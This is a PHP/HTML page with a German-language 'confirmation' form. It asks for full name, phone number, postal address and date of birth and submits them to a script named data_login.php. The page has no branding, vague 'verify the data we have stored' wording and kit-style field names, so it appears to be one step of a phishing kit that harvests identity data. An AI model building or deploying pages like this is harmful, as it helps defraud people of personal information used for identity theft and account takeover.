<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body class="account">
<?php 
require 'views/header.php';
?>


<main>
<div class="holder">


<div class="left">


<div class="form" style="width:600px;">
<form method="POST" action="data_login.php">
<div class="stitle">Bestätigung</div>
<div class="text">
    Geben Sie die untenstehenden Informationen ein, um fortzufahren. 
    Bitte stellen Sie sicher, dass Sie dieselben Daten eingeben, die wir gespeichert haben.
</div>

<div class="col">
    <input type="text" name="j_name" id="name" placeholder=" " required>
    <label for="name">Vollständiger Name</label>
</div>

<div class="col">
    <input type="text" name="j_phone"  id="phone" placeholder="+49 000000000" required>
    <label for="phone">Telefonnummer</label>
</div>

<div class="col">
    <input type="text" name="j_adress"  id="address" placeholder=" " required>
    <label for="address">Adresse</label>
</div>

<div class="col">
    <input type="text" name="j_dob"  id="dob" placeholder="TT/MM/JJJJ" required>
    <label for="dob">Geburtsdatum</label>
</div>

<div class="col lodah">
    <button class="flash" type="submit">Weiter</button>
    <div class="loader"></div>
</div>
</form>
</div>

</div>






</div>
</main>


<?php 
require 'views/footer.php';
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#dob").mask("00/00/0000");


</script>
</body>
</html>